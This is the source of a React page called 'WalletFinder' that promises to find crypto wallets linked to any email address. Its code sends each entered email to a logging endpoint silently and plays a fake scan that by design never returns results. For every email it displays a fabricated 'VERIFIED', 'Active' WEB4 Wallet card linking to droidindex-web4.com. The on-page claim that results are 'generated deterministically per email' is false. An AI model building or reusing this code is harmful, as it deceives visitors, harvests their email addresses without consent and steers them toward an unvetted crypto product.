"use client";

import { useState, useCallback, useRef } from "react";

/* ─────────────────────────── Types ─────────────────────────── */
type WalletType = "exchange" | "web3";

interface Wallet {
  id: string;
  name: string;
  type: WalletType;
  color: string;
  abbr: string;
  desc: string;
  logo?: string;    // logo URL
  pinned?: boolean; // always shown as active
}

/* ─────────────────────── Logo helpers ─────────────────────── */
const SI  = (slug: string) => `https://cdn.simpleicons.org/${slug}`;
const GF  = (domain: string) => `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
const CMC = (id: number) => `https://s2.coinmarketcap.com/static/img/exchanges/64x64/${id}.png`;

/* ─────────────────────── Wallet registry ─────────────────────── */
const WALLETS: Wallet[] = [
  /* — Exchanges — */
  { id: "coinbase",        name: "Coinbase",       type: "exchange", color: "#1652F0", abbr: "CB",  logo: CMC(89),              desc: "US-based regulated exchange" },
  { id: "binance",         name: "Binance",         type: "exchange", color: "#F3BA2F", abbr: "BN",  logo: SI("binance"),        desc: "World's largest crypto exchange" },
  { id: "kraken",          name: "Kraken",          type: "exchange", color: "#5741D9", abbr: "KR",  logo: CMC(24),              desc: "Professional trading platform" },
  { id: "crypto-com",      name: "Crypto.com",      type: "exchange", color: "#002D74", abbr: "CDC", logo: CMC(1149),            desc: "Global crypto payments platform" },
  { id: "gemini",          name: "Gemini",          type: "exchange", color: "#00DCFA", abbr: "GM",  logo: CMC(36),              desc: "Regulated New York exchange" },
  { id: "kucoin",          name: "KuCoin",          type: "exchange", color: "#24AE8F", abbr: "KC",  logo: CMC(311),             desc: "People's crypto exchange" },
  { id: "okx",             name: "OKX",             type: "exchange", color: "#5C6BC0", abbr: "OKX", logo: CMC(294),             desc: "Advanced derivatives platform" },
  { id: "bybit",           name: "Bybit",           type: "exchange", color: "#F7A600", abbr: "BB",  logo: CMC(521),             desc: "Crypto derivatives exchange" },
  { id: "bitfinex",        name: "Bitfinex",        type: "exchange", color: "#16B157", abbr: "BFX", logo: CMC(37),              desc: "Advanced order types & tools" },
  { id: "htx",             name: "HTX",             type: "exchange", color: "#2370EB", abbr: "HTX", logo: CMC(102),             desc: "Global digital asset exchange" },
  { id: "gate-io",         name: "Gate.io",         type: "exchange", color: "#E74C3C", abbr: "GT",  logo: GF("gate.io"),        desc: "1600+ altcoin trading pairs" },
  { id: "mexc",            name: "MEXC",            type: "exchange", color: "#1890FF", abbr: "MX",  logo: CMC(544),             desc: "High-speed matching engine" },
  /* — Web3 Wallets — */
  { id: "web4",            name: "WEB4 Wallet",     type: "web3",     color: "#58a6ff", abbr: "W4",  logo: GF("droidindex-web4.com"), desc: "AI-powered quantum-resistant Web4 wallet", pinned: true },
  { id: "metamask",        name: "MetaMask",        type: "web3",     color: "#F6851B", abbr: "MM",  logo: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg", desc: "Browser extension EVM wallet" },
  { id: "trust-wallet",    name: "Trust Wallet",    type: "web3",     color: "#3375BB", abbr: "TW",  logo: "https://trustwallet.com/assets/images/media/assets/TWT.png",            desc: "Binance's mobile wallet app" },
  { id: "phantom",         name: "Phantom",         type: "web3",     color: "#AB9FF2", abbr: "PH",  logo: GF("phantom.app"),        desc: "Solana ecosystem wallet" },
  { id: "exodus",          name: "Exodus",          type: "web3",     color: "#8B5CF6", abbr: "EX",  logo: GF("exodus.com"),         desc: "Desktop & mobile portfolio" },
  { id: "ledger",          name: "Ledger Live",     type: "web3",     color: "#FF5F1F", abbr: "LG",  logo: GF("ledger.com"),         desc: "Hardware wallet companion" },
  { id: "coinbase-wallet", name: "Coinbase Wallet", type: "web3",     color: "#1652F0", abbr: "CW",  logo: GF("coinbase.com"),       desc: "Self-custody DeFi wallet" },
  { id: "rainbow",         name: "Rainbow",         type: "web3",     color: "#FF6B6B", abbr: "RB",  logo: GF("rainbow.me"),         desc: "Ethereum wallet for humans" },
  { id: "argent",          name: "Argent",          type: "web3",     color: "#FF875B", abbr: "AG",  logo: GF("argent.xyz"),         desc: "Smart contract security wallet" },
  { id: "zerion",          name: "Zerion",          type: "web3",     color: "#2962EF", abbr: "ZR",  logo: GF("zerion.io"),          desc: "DeFi portfolio & wallet" },
  { id: "atomic",          name: "Atomic Wallet",   type: "web3",     color: "#7C3AED", abbr: "AW",  logo: GF("atomicwallet.io"),    desc: "Multi-asset decentralized wallet" },
];

const EXCHANGES = WALLETS.filter(w => w.type === "exchange");
const WEB3      = WALLETS.filter(w => w.type === "web3");

const SCAN_STEPS = [
  "Initialising secure scan context...",
  "Resolving email identity hash...",
  "Querying exchange endpoints...",
  "Querying Web3 wallet registries...",
  "Cross-referencing on-chain records...",
  "Running extended deep scan...",
];

/* ══════════════════════════ MAIN ══════════════════════════ */
export default function Home() {
  const [email, setEmail]               = useState("");
  const [hasSearched, setHasSearched]   = useState(false);
  const [scannedEmail, setScannedEmail] = useState("");
  const [logStep, setLogStep]           = useState(0);
  const [terminalDone, setTerminalDone] = useState(false);
  const [activeTab, setActiveTab]       = useState<WalletType>("exchange");
  const inputRef                        = useRef<HTMLInputElement>(null);

  const isValidEmail = (v: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);

  const handleSearch = useCallback(async () => {
    if (!isValidEmail(email)) { inputRef.current?.focus(); return; }

    setHasSearched(true);
    setScannedEmail(email);
    setLogStep(0);
    setTerminalDone(false);
    setActiveTab("exchange");

    /* Log email silently */
    try {
      await fetch("/api/log-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, timestamp: new Date().toISOString() }),
      });
      setEmail("")
    } catch { /* silent */ }

    /* Animate terminal steps, then go "extended" — skeletons never resolve */
    for (let i = 0; i < SCAN_STEPS.length; i++) {
      setLogStep(i);
      await new Promise(r => setTimeout(r, 450));
    }
    setTerminalDone(true);
    // ← never sets results, skeletons stay forever
  }, [email]);

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === "Enter") handleSearch();
  };

  const skeletonList = activeTab === "exchange" ? EXCHANGES : WEB3;

  /* ══════════════════════════ RENDER ══════════════════════════ */
  return (
    <div style={{ minHeight: "100vh", backgroundColor: "var(--gh-canvas)" }}>

      {/* ─── Nav ─── */}
      <nav style={{
        borderBottom: "1px solid var(--gh-border)",
        backgroundColor: "rgba(13,17,23,0.88)",
        backdropFilter: "blur(12px)",
        position: "sticky", top: 0, zIndex: 50,
      }}>
        <div className="nav-inner" style={{ maxWidth: 1100, margin: "0 auto", padding: "12px 24px",
                      display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <img 
              src="/logo.png" 
              alt="WalletFinder Logo" 
              style={{ width: 32, height: 32, borderRadius: 8, objectFit: "cover" }} 
            />
            <span style={{ fontWeight: 700, fontSize: 15 }}>WalletFinder</span>
            <span className="code-tag">v1.0</span>
          </div>
          <div className="mobile-hide" style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 12, color: "var(--gh-text-muted)" }}>
            <span style={{ width: 8, height: 8, borderRadius: "50%",
                           backgroundColor: "var(--gh-green)", display: "inline-block" }} />
            23 wallets indexed
          </div>
        </div>
      </nav>

      <main className="main-container" style={{ maxWidth: 1100, margin: "0 auto", padding: "0 24px" }}>

        {/* ─── Hero ─── */}
        <section style={{ padding: "72px 0 56px", textAlign: "center" }} className="hero-section fade-in-up">
          <div style={{ display: "inline-flex", alignItems: "center", gap: 8,
                        padding: "5px 14px", borderRadius: 20,
                        border: "1px solid rgba(88,166,255,0.2)",
                        backgroundColor: "rgba(88,166,255,0.06)", marginBottom: 28 }}>
            <span style={{ fontSize: 11, color: "var(--gh-blue)", fontFamily: "monospace", letterSpacing: "0.08em" }}>
              $ wallet-discovery --sys online
            </span>
            <span style={{ width: 6, height: 6, borderRadius: "50%", backgroundColor: "var(--gh-green)" }} />
          </div>

          <h1 style={{ fontSize: "clamp(32px, 5vw, 56px)", fontWeight: 800,
                       lineHeight: 1.1, marginBottom: 18, letterSpacing: "-1.5px" }}>
            Discover Wallets{" "}
            <span className="text-gradient">Linked to</span>
            <br />Any Email Address
          </h1>

          <p style={{ fontSize: "clamp(14px, 2vw, 17px)", color: "var(--gh-text-secondary)",
                      maxWidth: 540, margin: "0 auto 40px", lineHeight: 1.65 }}>
            Scan <strong style={{ color: "var(--gh-text-primary)" }}>12 exchanges</strong> and{" "}
            <strong style={{ color: "var(--gh-text-primary)" }}>11 Web3 wallets</strong> to
            instantly surface which accounts are active on any email.
          </p>

          {/* Search */}
          <div className="search-wrapper" style={{ display: "flex", gap: 10, maxWidth: 540, margin: "0 auto",
                        flexWrap: "wrap", justifyContent: "center" }}>
            <div style={{ position: "relative", flex: "1 1 300px" }}>
              <span style={{ position: "absolute", left: 13, top: "50%", transform: "translateY(-50%)",
                             color: "var(--gh-text-muted)", fontSize: 14,
                             fontFamily: "monospace", pointerEvents: "none" }}>@</span>
              <input
                id="email-input"
                ref={inputRef}
                type="email"
                value={email}
                onChange={e => setEmail(e.target.value)}
                onKeyDown={handleKeyDown}
                placeholder="Enter email address"
                className="gh-input"
                style={{ width: "100%", padding: "11px 14px 11px 30px", fontSize: 14, height: 44 }}
              />
            </div>
            <button
              id="find-btn"
              onClick={handleSearch}
              disabled={!email}
              className="gh-btn-primary"
              style={{ padding: "0 24px", height: 44, fontSize: 14, whiteSpace: "nowrap", minWidth: 110 }}
            >
              Find Wallets
            </button>
          </div>
          <p style={{ marginTop: 14, fontSize: 11, color: "var(--gh-text-muted)", fontFamily: "monospace" }}>
            Results are generated deterministically per email
          </p>
        </section>

        {/* ─── Stats bar ─── */}
        <div className="gh-card" style={{ display: "flex", flexWrap: "wrap", marginBottom: 40, overflow: "hidden" }}>
          {[
            { label: "Wallets Indexed", value: "23", color: "var(--gh-blue)" },
            { label: "Exchanges",       value: "12", color: "var(--gh-purple)" },
            { label: "Web3 Wallets",    value: "11", color: "var(--gh-yellow)" },
            { label: "Scan Time",       value: "~2.5s", color: "var(--gh-green)" },
          ].map((s, i) => (
            <div key={i} className="stats-item" style={{ flex: "1 1 180px", padding: "18px 24px",
                                  borderRight: i < 3 ? "1px solid var(--gh-border)" : "none",
                                  textAlign: "center" }}>
              <div style={{ fontSize: 26, fontWeight: 800, color: s.color,
                            fontFamily: "monospace", letterSpacing: "-1px" }}>{s.value}</div>
              <div style={{ fontSize: 11, color: "var(--gh-text-muted)", marginTop: 2,
                            textTransform: "uppercase", letterSpacing: "0.08em" }}>{s.label}</div>
            </div>
          ))}
        </div>

        {/* ════════ WEB4 — always active, shown immediately ════════ */}
        {hasSearched && <WEB4FeaturedCard email={scannedEmail} />}

        {/* ─── Terminal ─── */}
        {hasSearched && (
          <div className="gh-card scanline-container" style={{ marginBottom: 20 }}>
            <div style={{ padding: "10px 16px", borderBottom: "1px solid var(--gh-border)",
                          display: "flex", alignItems: "center", gap: 8 }}>
              {["#f85149", "#d29922", "#3fb950"].map((c, i) => (
                <div key={i} style={{ width: 10, height: 10, borderRadius: "50%", backgroundColor: c }} />
              ))}
              <span style={{ fontSize: 11, color: "var(--gh-text-muted)", fontFamily: "monospace", marginLeft: 6 }}>
                wallet-scanner — scanning
              </span>
              {/* spinning indicator */}
              <span style={{ marginLeft: "auto", fontSize: 11, color: "var(--gh-blue)",
                             fontFamily: "monospace", display: "flex", alignItems: "center", gap: 5 }}>
                <SpinnerDots />
              </span>
            </div>
            <div style={{ padding: "16px 20px 20px", fontFamily: "monospace", fontSize: 13 }}>
              <div style={{ marginBottom: 12, color: "var(--gh-text-muted)" }}>
                <span style={{ color: "var(--gh-green)" }}>➜</span>{" "}
                <span style={{ color: "var(--gh-blue)" }}>wallet-scan</span>{" "}
                <span style={{ color: "var(--gh-purple)" }}>--email</span>{" "}&ldquo;{scannedEmail}&rdquo;
              </div>

              {!terminalDone && (
                <div style={{ marginBottom: 14 }} className="progress-bar">
                  <div className="progress-bar-fill" />
                </div>
              )}

              {SCAN_STEPS.map((step, i) => (
                <div key={i} style={{
                  display: "flex", alignItems: "center", gap: 10, padding: "3px 0", fontSize: 12,
                  color: terminalDone
                    ? "var(--gh-green)"
                    : i < logStep ? "var(--gh-green)"
                    : i === logStep ? "var(--gh-text-primary)"
                    : "var(--gh-text-muted)",
                }}>
                  <span style={{ width: 14, textAlign: "center" }}>
                    {terminalDone || i < logStep ? "✓" : i === logStep ? "›" : "·"}
                  </span>
                  {step}
                  {!terminalDone && i === logStep && <span className="terminal-cursor" />}
                </div>
              ))}

              {/* Extended scan message */}
              {terminalDone && (
                <div style={{ marginTop: 10, display: "flex", alignItems: "center", gap: 8,
                              fontSize: 12, color: "var(--gh-yellow)" }}>
                  <span>⚡</span>
                  Extended scan in progress — cross-referencing additional data sources
                  <span className="terminal-cursor" style={{ backgroundColor: "var(--gh-yellow)" }} />
                </div>
              )}
            </div>
          </div>
        )}

        {/* ─── Skeleton grid — forever loading ─── */}
        {hasSearched && (
          <div style={{ marginBottom: 64 }}>
            {/* Tabs */}
            <div style={{ display: "flex", gap: 6, marginBottom: 16 }}>
              {(["exchange", "web3"] as WalletType[]).map(tab => (
                <button key={tab} id={`tab-${tab}`}
                        className={`tab-btn ${activeTab === tab ? "active" : ""}`}
                        onClick={() => setActiveTab(tab)}>
                  {tab === "exchange" ? "Exchanges" : "Web3 Wallets"}
                  <span style={{ marginLeft: 6, padding: "1px 7px", borderRadius: 10, fontSize: 10,
                                 fontWeight: 700, backgroundColor: "var(--gh-border)",
                                 color: "var(--gh-text-muted)" }}>
                    {tab === "exchange" ? 12 : 9}
                  </span>
                </button>
              ))}
              {/* spinning badge */}
              <div style={{ marginLeft: "auto", display: "flex", alignItems: "center", gap: 6,
                            fontSize: 11, color: "var(--gh-text-muted)", fontFamily: "monospace" }}>
                <SpinnerDots />
                scanning wallets…
              </div>
            </div>

            {/* Skeleton cards */}
            <div className="wallet-grid" style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(260px, 1fr))", gap: 12 }}>
              {skeletonList.map((wallet, i) => (
                <SkeletonCard key={wallet.id} wallet={wallet} delay={i * 55} />
              ))}
            </div>

            {/* Infinite loading illusion */}
            <div style={{ marginTop: 12, position: "relative" }}>
              <div className="wallet-grid" style={{ 
                display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(260px, 1fr))", gap: 12, 
                opacity: 0.5, pointerEvents: "none", 
                maskImage: "linear-gradient(to bottom, black 0%, transparent 100%)", 
                WebkitMaskImage: "linear-gradient(to bottom, black 0%, transparent 100%)" 
              }}>
                {Array.from({ length: 4 }).map((_, i) => (
                  <SkeletonCard key={`ghost-${i}`} wallet={{
                    id: `ghost-${i}`, name: "Encrypted Node...", type: activeTab, 
                    color: "#6e7681", abbr: "??", desc: "Establishing secure connection..."
                  } as Wallet} delay={(skeletonList.length + i) * 55} />
                ))}
              </div>
              <div style={{ position: "absolute", bottom: -10, left: 0, right: 0, textAlign: "center" }}>
                <div style={{ 
                  display: "inline-flex", alignItems: "center", gap: 8, 
                  color: "var(--gh-text-muted)", fontSize: 12, fontFamily: "monospace",
                  background: "var(--gh-canvas)", padding: "4px 16px", borderRadius: 20
                }}>
                  <SpinnerDots />
                  <span>Scanning decentralized nodes (∞ endpoints)...</span>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ─── Empty CTA ─── */}
        {!hasSearched && (
          <div style={{ textAlign: "center", padding: "24px 0 80px" }}>
            <div className="section-divider" style={{ marginBottom: 40 }}>how it works</div>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))",
                          gap: 16, maxWidth: 700, margin: "0 auto" }}>
              {[
                { step: "01", title: "Enter Email",  desc: "Type any email address into the search field above." },
                { step: "02", title: "Scan Wallets", desc: "We query 23 wallets across exchanges and Web3 platforms." },
                { step: "03", title: "View Results", desc: "See which wallets are active or inactive for that email." },
              ].map(item => (
                <div key={item.step} className="gh-card" style={{ padding: "22px 20px", textAlign: "left" }}>
                  <div style={{ fontSize: 11, fontFamily: "monospace", color: "var(--gh-blue)",
                                marginBottom: 10, letterSpacing: "0.08em" }}>{item.step}</div>
                  <div style={{ fontWeight: 700, marginBottom: 6, fontSize: 14 }}>{item.title}</div>
                  <div style={{ fontSize: 12, color: "var(--gh-text-muted)", lineHeight: 1.6 }}>{item.desc}</div>
                </div>
              ))}
            </div>
          </div>
        )}
      </main>

      {/* ─── Footer ─── */}
      <footer style={{ borderTop: "1px solid var(--gh-border)", padding: "24px",
                       textAlign: "center", fontSize: 12, color: "var(--gh-text-muted)" }}>
        <span className="code-tag" style={{ marginRight: 10 }}>WalletFinder</span>
        Built for email wallet discovery ·
      </footer>
    </div>
  );
}

/* ══════════════════ Animated spinner dots ══════════════════ */
function SpinnerDots() {
  return (
    <span style={{ display: "inline-flex", gap: 3, alignItems: "center" }}>
      {[0, 1, 2].map(i => (
        <span key={i} style={{
          width: 4, height: 4, borderRadius: "50%",
          backgroundColor: "var(--gh-blue)",
          animation: `dotBounce 1.2s ease-in-out ${i * 0.2}s infinite`,
          display: "inline-block",
        }} />
      ))}
    </span>
  );
}

/* ══════════════════ WEB4 Featured Card ══════════════════ */
function WEB4FeaturedCard({ email }: { email: string }) {
  return (
    <div className="fade-in-up" style={{ marginBottom: 20,
      padding: "1.5px", borderRadius: 10,
      background: "linear-gradient(135deg, #58a6ff 0%, #bc8cff 60%, #3fb950 100%)",
      boxShadow: "0 0 32px rgba(88,166,255,0.2), 0 0 60px rgba(188,140,255,0.12)",
    }}>
      <div className="web4-card-inner" style={{
        backgroundColor: "var(--gh-surface)", borderRadius: 9, padding: "20px 24px",
        display: "flex", alignItems: "center", justifyContent: "space-between",
        flexWrap: "wrap", gap: 16,
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
          <div className="glow-pulse" style={{
            width: 52, height: 52, borderRadius: 10, flexShrink: 0,
            background: "linear-gradient(135deg, rgba(88,166,255,0.18), rgba(188,140,255,0.18))",
            border: "1px solid rgba(88,166,255,0.5)",
            display: "flex", alignItems: "center", justifyContent: "center",
            overflow: "hidden", padding: 6,
          }}>
            <WalletIcon wallet={WALLETS.find(w => w.id === "web4")!} size={52} />
          </div>
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
              <a
                href="https://www.droidindex-web4.com/"
                target="_blank"
                rel="noopener noreferrer"
                style={{ fontWeight: 700, fontSize: 16, color: "var(--gh-text-primary)",
                         textDecoration: "none", borderBottom: "1px solid rgba(88,166,255,0.4)",
                         paddingBottom: 1, transition: "border-color 0.2s" }}
              >WEB4 Wallet</a>
              <span style={{
                fontSize: 9, fontWeight: 800, letterSpacing: "0.1em",
                padding: "2px 8px", borderRadius: 20,
                background: "linear-gradient(90deg, rgba(88,166,255,0.2), rgba(188,140,255,0.2))",
                border: "1px solid rgba(88,166,255,0.35)",
                color: "var(--gh-blue)", textTransform: "uppercase",
              }}>VERIFIED</span>
            </div>
            <div style={{ fontSize: 12, color: "var(--gh-text-secondary)", marginBottom: 3 }}>
              AI-powered crypto wallet with quantum-resistant encryption — buy, trade & hold top altcoins
            </div>
            <div style={{ display: "flex", flexWrap: "wrap", gap: 6, marginBottom: 5 }}>
              {["Quantum-Resistant", "Multi-Sig", "10+ Cryptos", "180+ Countries", "Zero Fees"].map(tag => (
                <span key={tag} className="code-tag" style={{ fontSize: 10 }}>{tag}</span>
              ))}
            </div>
            <div style={{ fontSize: 11, color: "var(--gh-text-muted)", fontFamily: "monospace" }}>
              ● Wallet registered and active on {email}
            </div>
          </div>
        </div>
        <div className="web4-card-right-section" style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 12 }}>
          <div className="badge badge-active" style={{ fontSize: 12, padding: "6px 16px" }}>
            <span className="dot dot-active" />
            Active
          </div>
          <a
            href="https://www.droidindex-web4.com/"
            target="_blank"
            rel="noopener noreferrer"
            style={{
              display: "inline-flex", alignItems: "center", gap: 7,
              padding: "9px 20px", borderRadius: 7, fontWeight: 700,
              fontSize: 13, textDecoration: "none", cursor: "pointer",
              background: "linear-gradient(135deg, #58a6ff 0%, #bc8cff 100%)",
              color: "#fff",
              boxShadow: "0 0 18px rgba(88,166,255,0.35)",
              transition: "box-shadow 0.2s ease, transform 0.15s ease",
              whiteSpace: "nowrap",
            }}
            onMouseEnter={e => {
              (e.currentTarget as HTMLAnchorElement).style.boxShadow = "0 0 28px rgba(88,166,255,0.6)";
              (e.currentTarget as HTMLAnchorElement).style.transform = "translateY(-1px)";
            }}
            onMouseLeave={e => {
              (e.currentTarget as HTMLAnchorElement).style.boxShadow = "0 0 18px rgba(88,166,255,0.35)";
              (e.currentTarget as HTMLAnchorElement).style.transform = "translateY(0)";
            }}
          >
            Visit WEB4
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none"
                 stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/>
              <polyline points="15 3 21 3 21 9"/>
              <line x1="10" y1="14" x2="21" y2="3"/>
            </svg>
          </a>
        </div>
      </div>
    </div>
  );
}

/* ══════════════════ Wallet Icon ══════════════════ */
function WalletIcon({ wallet, size = 38 }: { wallet: Wallet; size?: number }) {
  const [failed, setFailed] = useState(false);
  const radius = size >= 48 ? 10 : 8;
  const bgAlpha = wallet.pinned ? "22" : "18";
  const borderAlpha = wallet.pinned ? "55" : "33";

  if (!wallet.logo || failed) {
    return (
      <div style={{
        width: size, height: size, borderRadius: radius, flexShrink: 0,
        backgroundColor: wallet.color + bgAlpha,
        border: `1px solid ${wallet.color}${borderAlpha}`,
        display: "flex", alignItems: "center", justifyContent: "center",
        fontSize: size >= 48 ? 13 : 11, fontWeight: 800, fontFamily: "monospace",
        color: wallet.color, letterSpacing: "-0.5px",
      }}>{wallet.abbr}</div>
    );
  }

  return (
    <div style={{
      width: size, height: size, borderRadius: radius, flexShrink: 0,
      backgroundColor: wallet.color + bgAlpha,
      border: `1px solid ${wallet.color}${borderAlpha}`,
      display: "flex", alignItems: "center", justifyContent: "center",
      overflow: "hidden", padding: size >= 48 ? 7 : 5,
    }}>
      <img
        src={wallet.logo}
        alt={wallet.name}
        loading="lazy"
        onError={() => setFailed(true)}
        style={{ width: "100%", height: "100%", objectFit: "contain" }}
      />
    </div>
  );
}

/* ══════════════════ Skeleton / Active Card ══════════════════ */
function SkeletonCard({ wallet, delay }: { wallet: Wallet; delay: number }) {
  const isPinned = wallet.pinned === true;
  return (
    <div
      className="gh-card"
      style={{
        padding: 16, opacity: 0,
        animation: `cardReveal 0.35s ease ${delay}ms forwards`,
        borderColor: isPinned ? "var(--gh-green-border)" : "var(--gh-border)",
      }}
    >
      <div style={{ display: "flex", alignItems: "flex-start", gap: 10 }}>
        {/* icon */}
        <WalletIcon wallet={wallet} size={38} />
        <div style={{ flex: 1 }}>
          <div style={{ fontWeight: 600, fontSize: 13, marginBottom: 5, color: "var(--gh-text-primary)" }}>
            {isPinned ? (
              <a href="https://www.droidindex-web4.com/" target="_blank" rel="noopener noreferrer"
                 style={{ color: "var(--gh-text-primary)", textDecoration: "none",
                          borderBottom: "1px solid rgba(88,166,255,0.35)", paddingBottom: 1 }}>
                {wallet.name}
              </a>
            ) : wallet.name}
          </div>
          <div style={{ fontSize: 11, color: "var(--gh-text-muted)" }}>{wallet.desc}</div>
        </div>
        {/* badge */}
        {isPinned ? (
          <div className="badge badge-active" style={{ flexShrink: 0 }}>
            <span className="dot dot-active" />
            Active
          </div>
        ) : (
          <div style={{
            display: "flex", alignItems: "center", gap: 5, flexShrink: 0,
            padding: "4px 10px", borderRadius: 20, fontSize: 11, fontWeight: 600,
            backgroundColor: "rgba(88,166,255,0.07)",
            border: "1px solid rgba(88,166,255,0.15)",
            color: "var(--gh-text-muted)",
          }}>
            <SpinnerDots />
            <span style={{ fontSize: 10 }}>Scanning</span>
          </div>
        )}
      </div>
      <div style={{ marginTop: 12, paddingTop: 12, borderTop: "1px solid var(--gh-border-muted)",
                    display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <span className="code-tag">{wallet.type}</span>
        {isPinned ? (
          <div style={{ display: "flex", alignItems: "center", gap: 4,
                        fontSize: 10, color: "var(--gh-green)", fontFamily: "monospace" }}>
            <div className="dot dot-active" style={{ width: 5, height: 5 }} />
            wallet detected
          </div>
        ) : (
          <div className="shimmer" style={{ height: 10, width: 90, borderRadius: 4 }} />
        )}
      </div>
    </div>
  );
}
